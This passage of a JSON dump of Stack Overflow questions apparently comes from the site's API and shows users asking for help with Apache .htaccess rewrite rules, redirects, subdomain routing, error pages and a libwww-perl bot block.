in my htaccess to better handle my urls when using a pagination function.  </p>\n\n<p>Currently my htaccess looks like this:</p>\n\n<pre><code>RewriteEngine On RewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule    ^([A-Za-z0-9-]+)/?$    index.php?alias=$1    [QSA,NC,L]\nRewriteRule    ^([A-Za-z0-9-]+)/([A-Za-z0-9-]+)/?$    index.php?alias=$1/$2    [QSA,NC,L]  \n</code></pre>\n\n<p>basically, I have two rules.  At first I only had the second one, to direct all requests to my index page, where I then parse out some details of the url in order to show the correct content.  I found that it didnt work for urls with only one sub directory, like example.com/bars, but only two directories like, example.com/bars/bar-name, so I added the rule before it.</p>\n\n<p>This has been working great for me.  All of my urls look great and the ?alias=bars/bars-name has been completlely hidden and now looks like /bars/bars-name</p>\n\n<p>Recently though I have integrated a pagination php function.  This function creates urls that looks like this:</p>\n\n<pre><code>example.com/bars?alias=bars&amp;info=mysql_table_bars&amp;page=2\n</code></pre>\n\n<p>Basically, 'info' is the table name that the pagination function queries, and 'page' is the current page.  It seems 'alias' also started showing in the url once I started using this function.</p>\n\n<p>What I would like is for my pagination to look like these examples:</p>\n\n<pre><code>example.com/bars/page/2\nexample.com/hotels/page/5\netc...\n</code></pre>\n\n<p>What do I need to add to my htaccess to handle this situation?  Also, is there a way to simplify my existing two rules?</p>\n"},{"tags":[".htaccess","redirect","root","hashtag"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":17,"score":0,"question_id":13091174,"title":"htaccess redirect to website root keeping hashtag","body":"<p>Been trying to get the following done</p>\n\n<p>redirect from </p>\n\n<p><a href=\"http://www.mydomain.com/submissions/#22.322.1\" rel=\"nofollow\">http://www.mydomain.com/submissions/#22.322.1</a></p>\n\n<p>to</p>\n\n<p><a href=\"http://www.mydomain.com/#22.322.1\" rel=\"nofollow\">http://www.mydomain.com/#22.322.1</a></p>\n\n<p>So far totaly unsuccesfull, (besides crashing the server).</p>\n\n<p>Help appreciated,\nPeter</p>\n"},{"tags":[".htaccess","robots","libwww-perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":202,"score":0,"question_id":10138097,"title":"Block 'libwww-perl' in WordPress htaccess","body":"<p>How can I block <a href=\"http://en.wikipedia.org/wiki/Library_for_WWW_in_Perl\" rel=\"nofollow\">libwww-perl</a> bad bots in my <code>htaccess</code> file in WordPress... I followed some instructions by seoTOOLS, but it isn't working - the instructions were for a generic Apache file, and has it to be done differently in <a href=\"http://en.wikipedia.org/wiki/WordPress\" rel=\"nofollow\">WordPress</a>?</p>\n\n<pre><code>#BEGIN WordPress\n\nRewriteEngine On \nRewriteBase / RewriteRule ^index.php$ - [L] \nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d \nRewriteRule . /index.php [L]\n\n#END WordPress\n\nSetEnvIfNoCase User-Agent \"^libwww-perl*\" block_bad_bots Deny from env=block_bad_bots\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13085466,"title":"CodeIgniter .htaccess links","body":"<p>I am new to codeIgniter and .htaccess stuff.\nI already made to remove the index.php to <code>localhost/ci/index.php/site/home</code>.\nSo my home page can access now to <code>localhost/ci</code> or <code>localhost/ci/site/home</code>.</p>\n\n<p>I have</p>\n\n<pre><code>&lt;a href=\"home\"&gt;Home&lt;/a&gt; and &lt;a href=\"about\"&gt;About&lt;/a&gt;\n</code></pre>\n\n<p>I can access Home and About if I Am on this link <code>localhost/ci/site/home</code>.\nBut once I'm on <code>localhost/ci</code> the problem exists because when I click to <code>&lt;a href=\"about\"&gt;About&lt;/a&gt;</code> the site is redirecting me to <code>localhost/ci/about</code> instead of <code>localhost/ci/site/about</code>. I change the links to <code>&lt;a href=\"site/home\"&gt;Home&lt;/a&gt; and &lt;a href=\"site/about\"&gt;About&lt;/a&gt;</code> the browser keeps adding the <code>/site</code> every click like\n<code>localhost/ci/site/site/site/site/site/site/home</code></p>\n\n<p>Anyone can help me to fix the problem?</p>\n\n<p>.htaccess</p>\n\n<pre><code> &lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /ci\n\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#When your application folder isn't in the system folder\n#This snippet prevents user access to the application folder\n#Submitted by: Fabdrol\n#Rename 'application' to your applications folder name.\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#Checks to see if the user is attempting to access a valid file,\n#such as an image or css document, if this isn't true it sends the\n#request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\nErrorDocument 404 /index.php\n</code></pre>\n\n<p>  </p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13084476,"title":".haccess rewrite rule","body":"<p>I want to rewrite new rule in htaccess file and i tried lot but every time i get page not found error.</p>\n\n<p>My htaccess file </p>\n\n<pre><code># BEGIN REMOVE SLUG CUSTOM POST TYPE RULES\nRewriteRule ^service-status/(.+)/$ /$1 [R=301,L]\nRewriteRule ^country/(.+)/$ /$1 [R=301,L]\nRewriteRule ^company/(.+)/$ /$1 [R=301,L]\n# END REMOVE SLUG CUSTOM POST TYPE RULES\n\nRewriteRule ^([a-zA-Z0-9_-]+)/numero ?country=$1 [L]\nRewriteRule ^introduction/([a-zA-Z0-9_-]+) ?company=$1\nRewriteRule ^pays/(.+)?$ /pays?company=$1\nRewriteRule ^([^/]*)/([^/]*)/$ /index.php?country=$1&amp;company=$2\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\n RewriteEngine On\nRewriteBase /ade/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /ade/index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>I want url like</p>\n\n<p><a href=\"http://abc.com/pays/company-name/numero\" rel=\"nofollow\">http://abc.com/pays/company-name/numero</a> (pays and numero is fix key word).</p>\n\n<p>I have write rule \n      RewriteRule ^pays/(.+)?$ /pays?company=$1</p>\n\n<p>for url </p>\n\n<p><a href=\"http://abc.com/pay/company-name/\" rel=\"nofollow\">http://abc.com/pay/company-name/</a> </p>\n\n<p>this is working fine for me.</p>\n\n<p>I also used </p>\n\n<pre><code>RewriteRule ^([a-zA-Z0-9_-]+)/numero ?country=$1 [L]\n</code></pre>\n\n<p>Rule with numero keyword </p>\n\n<p>(http://abc.com/contury-name/numero)</p>\n\n<p>also wont url with numero key word like</p>\n\n<p><a href=\"http://abc.com/contury-name/comany-name/numero\" rel=\"nofollow\">http://abc.com/contury-name/comany-name/numero</a></p>\n\n<p>Is it possible ?</p>\n\n<p>Thanks </p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13083255,"title":"How to rewrite this type of url via htaccess?","body":"<p>I've got this Rewrite Rule.</p>\n\n<pre><code>RewriteRule ^news/([0-9]+))/? /index.php?show=news&amp;id=$1\n</code></pre>\n\n<p>Now I need to add some GET data (partner) to the end of url. F.e. /news/1/?partner=some_partner</p>\n\n<p>I tried this</p>\n\n<pre><code>RewriteRule ^news/([0-9]+))/(.*)*? /index.php$2&amp;show=news&amp;id=$1\n</code></pre>\n\n<p>Because I'm gathering partner data</p>\n\n<pre><code>if (isset($_GET['partner'])) addPartnerStat($_GET['partner']);\n</code></pre>\n\n<p>And I need exactly this url's view /news/1/?partner=some_partner, not /news/1/partner/some_partner</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","subdomain"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13080704,"title":"htaccess create the appearance of a subdomin but use a MVC controller instead of a folder","body":"<p>Ok I am using MVC, specifically Codeigniter.</p>\n\n<p>I have a need to create a sub domain on the service I am building. To pass a more \"Mobile\" friend version of the service to a user. Via m.example.com. Generally I would just add a virtual host, put everything in a folder, and so on and so forth, but since I am using MVC on this project most of the functionality lies in models and libs of which are agnostic to the view or even the controllers as far as the output they have. </p>\n\n<p>So my current train of thought is that it would be a waste or resouces to create a whole new folder on the machine that has the same exact stuff as the mvc currently in use has, just for the sake of using it as m.example.com. So I am wondering (cause it works this way currently with index.php) Is there a way to say I assume through htaccess that when traffic through m.example.com comes through, that I use a specific controller path, rather than a folder path? So that way just like its big brother index.php m.php (controller in this example) can handle all the core traffic and just have a bunch of functions that connect to the models, libs, etc..  </p>\n\n<p>In a comment i made below to someone. I said</p>\n\n<blockquote>\n  <p>No, m.php is not in root, its a controller.. I am trying to route any\n  requests to  m.example.com to the m.php controller (m.php is in the\n  controller directory, following suit with the MVC pattern), I can\n  access <a href=\"http://example.com/m/function/param/\" rel=\"nofollow\">http://example.com/m/function/param/</a> following the MVC logic,\n  but I would like to have it so <a href=\"http://m.example.com/function/param/\" rel=\"nofollow\">http://m.example.com/function/param/</a> is\n  equal to that of the mvc logic</p>\n</blockquote>\n\n<p>Which ultimately means I am trying to come up with a logic either through .htaccess or some other means that <a href=\"http://example.com/m/function/param/\" rel=\"nofollow\">http://example.com/m/function/param/</a> and <a href=\"http://m.example.com/function/param/\" rel=\"nofollow\">http://m.example.com/function/param/</a> are the same exact thing, preferably without making a mirror copy of the entire CI installation and code I've built on to it, and putting it in a directory called <code>m</code> for example. I emphasize on this cause there seems to be some confusion.</p>\n"},{"tags":["linux",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13079595,"title":"htaccess rewrite different folder url, two index files","body":"<p>I've been searching for awhile now and haven't found anything that comes close to what I'm trying to accomplish.</p>\n\n<p>Right now my URL's look like this:</p>\n\n<pre><code>www.website.com/something\n</code></pre>\n\n<p>which are using the root folder <code>/index.php</code></p>\n\n<p>Now I have created plugins within folders:</p>\n\n<pre><code>/plugins/PLUGINNAME/index.php\n</code></pre>\n\n<p>I want to be able to have URLs like:</p>\n\n<pre><code>www.website.com/plugins/PLUGINNAME/anything/iwant/here\n</code></pre>\n\n<p>which are all using <code>/plugins/PLUGINNAME/index.php</code> and not the root directory <code>index.php</code>.</p>\n\n<p>Currently <code>www.website.com/plugins/PLUGINNAME/</code> works, but anything after <code>/PLUGINNAME/xxx</code> defaults to the <code>/index.php</code>.</p>\n"},{"tags":["php","apache",".htaccess","php.ini"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":660,"score":2,"question_id":4740614,"title":"ForceType/htaccess file extension question - extensionless files?","body":"<p>This is my .htaccess file:</p>\n\n<pre><code>&lt;IfModule php4/5.c&gt;\nphp_admin_flag Option\nphp_flag Option\nphp_admin_value Option\nphp_value Option\n&lt;/IfModule&gt;  \n&lt;Files .&gt;\nForceType application/x-httpd-php\nSetHandler application/x-httpd-php\n&lt;/Files&gt;\n</code></pre>\n\n<p>The above code somehow works, but I'm not sure why though... I expected a 500 error. I'm OK at .htaccess, but mainly for things like blocking robots/spiders etc. rather than filetypes. The top of the file is meant for custom php.ini files (I was trying to replicate on my own Apache server as if I had no access to the proper php.ini file, like they do on web hosting companies' sites, just for added realism on my testing sites).</p>\n\n<p>Although I understand how to use ForceType and SetHandler, I'm not sure how to use it for extensionless files (e.g. if I had a file called testing1, I could run it as php).</p>\n\n<p>Previously I did it this way:</p>\n\n<pre><code>&lt;Files testing1&gt;\nForceType application/x-httpd-php\nSetHandler application/x-httpd-php\n&lt;/Files&gt;\n</code></pre>\n\n<p>but it became tedious doing it for every single extensionless file.</p>\n\n<p>Basically, what I'm trying to do is to ensure that I have extensionless files via the ForceType/SetHandler directives, but is it possible? (and is the symbol above in my first example the wildcard one, or not?)</p>\n\n<p>Thanks</p>\n"}]}
{"total":14527,"page":5,"pagesize":100,"questions":[{"tags":[".htaccess","permissions"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":267,"score":0,"question_id":5018834,"title":"control access to a folder using .htaccess - only if using particular domain","body":"<p>i have 2 domains pointing to the same site - say a.com and b.com - i have a folder /admin on the site, that i only want to be accessible by people who access using b.com, so b.com/admin would work but a.com/admin would give an access error.</p>\n\n<p>Can this be done through htaccess?</p>\n\n<p>thanks in advance.</p>\n"},{"tags":["django",".htaccess","django-urls"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13080501,"title":"Overwrite the url in .htaccess file for django","body":"<p>I want to change the structure of the displayed client-side URL. I'm not too skilled using regex and coding for the .htaccess file. Basically, I have a structure that looks something like:</p>\n\n<pre><code>www.abc.com/login/?lang=es\n</code></pre>\n\n<p>I would like this to be displayed in the address bar as:</p>\n\n<p><code>www.abc.com/login/es</code></p>\n\n<p>So please tell me how i can overwrite the existing url in my .htaccess file.</p>\n\n<p>Thanks</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>My directory listing</p>\n\n<p>`</p>\n\n<blockquote>\n  <p>myproject</p>\n</blockquote>\n\n<p>------------- >my application</p>\n\n<p>------------- >settings/url directory</p>\n\n<blockquote>\n  <p>media<br>\n  templates`</p>\n</blockquote>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13075438,"title":"Apache ModRewrite Working in vhost but not .htaccess","body":"<p>I have the following mod rewrites:</p>\n\n<pre><code>RewriteEngine On\n\n# rest api rewrites\nRewriteCond %{REQUEST_URI} /api/v [NC]\nRewriteRule ^(.*)$ /index.php/$1 [L,QSA]\n\n# main application rewrite\nRewriteCond %{DOCUMENT_ROOT}%{REQUEST_FILENAME} !-f\nRewriteCond %{DOCUMENT_ROOT}%{REQUEST_FILENAME} !-d\nRewriteRule ^/[a-zA-Z0-9\\-\\_/]+?$ /index.html [L,QSA]\n</code></pre>\n\n<p>When I put these into my vhost config, everything works as excepted however when I put this into my .htaccess file, the first rewrite does an infinite loop (the log show an INTERNAL REWRITE) and the second rewrite doesn't work at all.</p>\n\n<p>Why would these rewrites would in the vhost but not my .htaccess file?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13075707,"title":".htaccess 301 redirect workaround","body":"<p>A client is placing a recruitment advert in the press featuring a custom url:</p>\n\n<p>e.g. www.clientsname.com/newjob</p>\n\n<p>...this page does not exist on the site but when people visit it they want it to redirect to their recruitment page:</p>\n\n<p>e.g. www.clientsname.com/recruitment</p>\n\n<p>This is how their .htaccess file currently looks:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?action=PublicDisplayPage&amp;url=$1 [L,QSA]\n</code></pre>\n\n<p>...I don't pretend to understand what the above does! However, I tried the following for the redirect:</p>\n\n<pre><code>Redirect 301 /newjob www.clientsname.com/recruitment\n</code></pre>\n\n<p>but this resulted in this url:</p>\n\n<p><a href=\"http://www.clientsname.com/recruitment?action=PublicDisplayPage&amp;url=newjob\" rel=\"nofollow\">http://www.clientsname.com/recruitment?action=PublicDisplayPage&amp;url=newjob</a></p>\n\n<p>Can anyone tell me what I need to do to get it to redirect to just <em>www.clientsname.com/recruitment</em> - i.e. without the <em>?action=PublicDisplayPage&amp;url=newjob</em></p>\n\n<p>Many thanks!</p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":97,"score":-2,"question_id":7056826,"title":"Help me set URL using .htaccess in CodeIgniter","body":"<p>I use CodeIgniter and I want to set URL by htaccess. I have tried many ways but have not succeeded yet.</p>\n\n<p>My folder structure :</p>\n\n<pre><code>--application\n----corntrollers\n-------public\n----------home.php\n----------log\n-------------- login.php\n-------admin\n----views\n-------public\n----------home.tpl\n----------log\n-------------- login.tpl\n--system\n--mysite\n</code></pre>\n\n<p>I want to set URL to rewrite :</p>\n\n<pre><code>http://localhost/mysite/index.php/log/login\n=&gt;\nhttp://localhost/mysite/log-in\n</code></pre>\n\n<p>How can I do that ?</p>\n"},{"tags":["php",".htaccess","url","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13079706,"title":"htaccess mod_rewrite on subdomain with subdirectories","body":"<p>I know there are <strong>TONS</strong> of questions on this website regarding this topic, as well as <strong>TONS</strong> of tutorials around google. However I have searched for a while now and I cannot seem to find one that explains my specific situation.</p>\n\n<p>I am building a social application in which the whole application is being stored in a directory of a subdomain the website like so: <strong>subdomain.example.com/network/</strong> &lt;-- network being the directory of all the application files.</p>\n\n<p>I have my .htaccess file located in the root of the subdomain and as of right now I have it removing .php from all the files and that is working throughout the entire project as it should. I have a user.php page which each user's profile is based off and the unique identifier for each user is their username (not 'id' like most people use.) So right now the urls look like <strong>/network/user.php?username=TylerB</strong> which is not very pretty. I have tried many different things to get this to look like <strong>/network/user/TylerB</strong> but nothing I try seems to work. I don't know if it's because it's in a directory, a subdomain or what. As of right now, when I have <strong>/network/user/TylerB</strong> (TylerB is my username) it gives me a 404 error.</p>\n\n<p>Here is my current .htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^user/([^/\\.]+)/?$ user.php?username=$1 [L]\nRewriteRule ^([a-z]+)/([a-z\\-]+)$ /$1/$2.php [L]\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13079844,"title":"Mod_rewrite remove index and append query strings","body":"<pre><code>RewriteEngine On\nRewriteBase /site1/\n\nRewriteRule ^(?:/(.*))?$ index.php?product=$1 [QSA,L]\n</code></pre>\n\n<p>I'm unable to get this mod_rewrite working. I get a 404 url not found whenever I have the appended query string on index. I'm trying to turn this:</p>\n\n<p><a href=\"http://www.domain.com/site1/index.php?product=mug\" rel=\"nofollow\">http://www.domain.com/site1/index.php?product=mug</a></p>\n\n<p>into this:</p>\n\n<p><a href=\"http://www.domain.com/site1/mug\" rel=\"nofollow\">http://www.domain.com/site1/mug</a></p>\n"},{"tags":[".htaccess","nginx"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":15,"score":-1,"question_id":13079083,"title":".htaccess on nginx","body":"<p>I have this .htaccess from other server :</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule (.*)(.*)/?$ index.php?tlederPageId=$1&amp;%{QUERY_STRING}\n</code></pre>\n\n<p>And I need it to work on nginx\nI looked up some tutorials and I still have no idea what to do.\nThanks in advance.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13069229,"title":"Removing the second question mark from URL","body":"<p>An external app calls my website with the following URL:\n<a href=\"http://www.mydomain.com/index.php?route=checkout/success?ref=56\" rel=\"nofollow\">http://www.mydomain.com/index.php?route=checkout/success?ref=56</a></p>\n\n<p>which is obviously wrong (since it has 2 questionmarks).</p>\n\n<p>How can I write an .htaccess rewrite rule to convert the second questionmark to ambersand (&amp;) ? (http://www.mydomain.com/index.php?route=checkout/success&amp;ref=56)</p>\n\n<p>I have tried this but it does not work.</p>\n\n<pre><code>RewriteEngine on\nRewriteRule \\? \\&amp; [L]\n</code></pre>\n"},{"tags":["apache",".htaccess","subdomain","shared-hosting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13039066,"title":"How to make sub folder exculsive access via sub domain only","body":"<p>I have web site hosted on shared hosting account which is managed by CPanel. It allows to create unlimited sub-domains. I have the following situation:</p>\n\n<p>Suppose that my primary domain there is: mydomain.com\nMy account's files are found on the hosting server at /home/myaccount/public_html\nI decided to make sub-domain named dir i.e dir.mydomain.com\nI created this sub-domain to use the following file:\n/home/myaccount/public_html/Hosts/directory</p>\n\n<p>Now I, successfully, able to access <a href=\"http://dir.mydomain.com\" rel=\"nofollow\">http://dir.mydomain.com</a>\nHowever, I need to prevent the access <a href=\"http://mydomain.com/Hosts/directory\" rel=\"nofollow\">http://mydomain.com/Hosts/directory</a> and exclusively restrict the access to the sub-domain.</p>\n\n<p>How could I achieve this using .htaccess?</p>\n\n<p>The following is a copy of the code I use in the .htaccess file found in /home/myaccount/public_html/Hosts/directory</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteRule    ^$    webroot/    [L]\n    RewriteRule    (.*) webroot/$1    [L]\n &lt;/IfModule&gt;\nAddType audio/mpeg mp3\nAddType text/xml xml   \n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite","error-handling"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13077683,"title":"ErrorDocument and PHP aren't working","body":"<p>I am not sure why but it seems that the errors are pushed to a default no-style error page and not my script. Here is the PHP bit that goes in the error.php code</p>\n\n<pre><code>&lt;?php \n\ndefine('QNX_APP_CODE', true); \n\n$status=$_SERVER['REDIRECT_STATUS'];\n$codes=array(\n      400 =&gt; array('400 Bad Request', 'The request cannot be fulfilled due to bad syntax.'),\n      401 =&gt; array('401 Login Error', 'It appears that the password and/or user-name you entered was incorrect.'),\n      403 =&gt; array('403 Forbidden', 'Sorry, employees and staff only.'),\n      404 =&gt; array('404 Missing', 'We\\'re sorry, but the page you\\'re looking for is missing, hiding, or maybe it moved somewhere else and forgot to tell you.'),\n      405 =&gt; array('405 Method Not Allowed', 'The method specified in the Request-Line is not allowed for the specified resource.'),\n      408 =&gt; array('408 Request Timeout', 'Your browser failed to send a request in the time allowed by the server.'),\n      414 =&gt; array('414 URL To Long', 'The URL you entered is longer than the maximum length.'),\n      500 =&gt; array('500 Internal Server Error', 'The request was unsuccessful due to an unexpected condition encountered by the server.'),\n      502 =&gt; array('502 Bad Gateway', 'The server received an invalid response from the upstream server while trying to fulfill the request.'),\n      504 =&gt; array('504 Gateway Timeout', 'The upstream server failed to send a request in the time allowed by the server.'),\n);\n\n$errortitle=$codes[$status][0];\n$message=$codes[$status][1];\n\nif($errortitle==false){\n       $errortitle=\"Unknown Error\";\n       $message=\"An unknown error has occurred.\";\n}\n\n?&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n</code></pre>\n\n<p>And here is the htaccess code</p>\n\n<pre><code>RewriteRule ^bad-request\\.asp$                error.php [L,QSA]\nRewriteRule ^authorization-required\\.asp$     error.php [L,QSA]\nRewriteRule ^page-not-found\\.asp$             error.php [L,QSA]\nRewriteRule ^forbidden\\.asp$                  error.php [L,QSA]\nRewriteRule ^internal-server-error\\.asp$      error.php [L,QSA]\n\nErrorDocument 400 /bad-request.asp\nErrorDocument 401 /authorization-required.asp\nErrorDocument 403 /forbidden.asp\nErrorDocument 404 /page-not-found.asp\nErrorDocument 500 /internal-server-error.asp\n</code></pre>\n\n<p>Any reason why its not being passed to error.php? But instead returning standard error pages</p>\n"},{"tags":["php",".htaccess","dns"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13077553,"title":"Redirect aliases to a specific folder","body":"<p>I need to redirect a specific domain aliases to a specific folder in main domain. Well, I'll  have only one host with the main domain data, I need do it:</p>\n\n<pre><code>http://a.com/\n-&gt; redirect automatically to: http://a.com/project-a\n-&gt; currently done\n\nhttp://a.com/project-a\nhttp://a.com/project-b\n-&gt; no redirect, it is the final folder\n-&gt; currently done\n\n### HERE: ###\nhttp://b.com/\n-&gt; redirect transparently to: http://a.com/project-b\n-&gt; I need do that!\n</code></pre>\n\n<p>Note that: the <code>b.com/...</code> need redirect all to <code>a.com/project-b/...</code> transparently. So, for instance:</p>\n\n<pre><code>http://b.com/ =&gt; http://a.com/project-b/\nhttp://b.com/news =&gt; http://a.com/project-b/news\n</code></pre>\n\n<p>I need know how I can do it in .htaccess file. The domain aliases are ok, but currently both <code>a.com</code> and <code>b.com</code> redirect to <code>a.com</code> host (it's correct), but <code>b.com</code> need work in a specific folder.</p>\n\n<p>I don't know if it is a problem, but the <code>/project-b</code> folder doesn't exists, it's a <code>mod_rewrite</code> to <code>index.php</code> only.</p>\n\n<p>I don't want to redirect by 301, I need do all transparently (user will think that they are in <code>b.com</code> hosting).</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","apache-config"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2906,"score":1,"question_id":1610576,"title":"Is it possible to have htaccess if else type rewrite conditions and rewrite rules?","body":"<p>I am trying to write an htaccess file that essentially does this:</p>\n\n<pre><code>if(requested file == \"some-file.php\" || requested file == \"some-file2.php\" || requested file == \"some-file3.php\")\n   then Rewrite to redirector.php?uri=some-file.php &lt;- substitute requested file without passing any parameters\nelse\n// existing rewrite conditions from silverstripe\nRewriteCond %{REQUEST_URI} ^(.*)$\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule .* sapphire/main.php?url=%1&amp;%{QUERY_STRING} [L]\n</code></pre>\n\n<p>Is this possible using htaccess?</p>\n"},{"tags":["php",".htaccess","url-rewriting","switch-statement"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13073200,"title":"Can't Change PHP Switch Case URL","body":"<p>This has been bothering me for awhile. I have some pages on my website that use PHP switch cases to change the content of the page. The problem I'm having is that the URLs for these pages are not very SEO friendly. </p>\n\n<p>I want to change \nthis:</p>\n\n<p><code>http://www.abcprintingink.com/printing.php?page=print-and-mail</code></p>\n\n<p>to this: </p>\n\n<p><code>http://www.abcprintingink.com/printing.php/print-and-mail</code> or better </p>\n\n<p><code>http://www.abcprintingink.com/printing/print-and-mail</code></p>\n\n<p>I've tried .htaccess and nothing works. Here is what I've tried in .htaccess:</p>\n\n<pre><code>RewriteEngine On\n#RewriteRule ^web.php/([^-]*)$ /web.php?page=$1 [QSA]\n\n#RewriteRule ^/web.php/?page\\=(.*)$ /web.php?page=$1 [l]\n\nRewriteRule ^web.php/(.*)$ /web.php?page=$1 [l]\n\nRewriteRule ^web.php/([a-zA-Z0-9\\-/\\.]+)/?$ web.php?page=$1 [L]\n</code></pre>\n\n<p>Other commands in .htaccess work so I know it's not the file or the webserver.</p>\n\n<p>This is the switch statement in printing.php</p>\n\n<pre><code>&lt;?php\n        /* SEO Switch Statements */\n        $pagename = \"printing\";\n        $page = htmlspecialchars($_GET[\"page\"]);\n\n        switch ($page) {\ncase 'print-and-mail':\n                $page_title = 'page title';\n                $page_description = 'page desc';\n                $page_nav_active = 'print-and-mail';\n                $page_content_copy = 'page text';\n                $template_slider_image = 'image';\n                break;\n}\n?&gt;\n</code></pre>\n\n<p>Also, this is the script behind the menus that link the pages.</p>\n\n<pre><code>    &lt;?php $menu=count($navigation); for ($i=0; $i&lt;$menu; $i++) \n{ echo '&lt;div&gt;&lt;li class=\"navigation\"&gt;&lt;a href=\"?page='.$navigation[$i].'\"&gt;'\n.$replaced = str_replace(\"-\", \" \", $navigation[$i]).'&lt;/a&gt;&lt;/li&gt;&lt;/div&gt;'; } ?&gt;\n</code></pre>\n"},{"tags":[".htaccess","cookies","multilingual","redirectwithcookies"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13075829,"title":"Multi-language redirect with cookies in .htaccess? (without php)","body":"<p>I'm trying to a site to have language detection via the browser, but to also allow for a cookie to take priority over the automatic detection.</p>\n\n<p>I'm still new at complex .htaccess rules, so I'm hoping for some help here. I don't know any php really though, so I'm hoping to avoid it.</p>\n\n<p>This is what I'm looking to do:</p>\n\n<p>I have 3 language options: german (de), english uk (en-gb), and the main site in english (en)\nThey correspond to: www.site.com/de/, www.site.com/uk/, and www.site.com/</p>\n\n<ol>\n<li><p>Check if a language cookie has been set <br/>\n    1a) If set, redirect visitor to corresponding language directory.</p></li>\n<li><p>If no cookie has been set:<br />2a) Detect browser language and set\nlanguage cookie (or default to english)<br />2b) Redirect visitor to\ncorresponding directory.</p></li>\n<li><p>If user switches language via site language selection, update\ncookie.</p></li>\n</ol>\n\n<p>Is something like this possible? Are there limitations to trying to do it this way?</p>\n"},{"tags":["php","string","query",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13073976,"title":"htaccess rewrite issue within subdirectory and using varibales... stumped","body":"<p>I have searched and searched and tried soo many different things that just didnt work... It is beyond me. I've tried at least 50 things with no luck.. someone please help!</p>\n\n<p>First I have a a file \"index.php\" page within the 